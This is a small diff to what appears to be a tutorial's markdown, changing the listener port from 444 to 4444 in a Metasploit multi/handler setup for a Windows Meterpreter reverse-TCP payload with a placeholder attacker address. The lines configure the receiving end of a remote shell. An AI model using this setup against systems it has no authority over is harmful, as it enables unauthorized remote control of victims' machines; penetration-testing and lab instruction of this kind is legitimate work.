@@ -50,7 +50,7 @@ sudo msfconsole
 ```bash
 use multi/handler
 set LHOST <YOUR_IP_ADDR>
-set LPORT 444
+set LPORT 4444
 set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
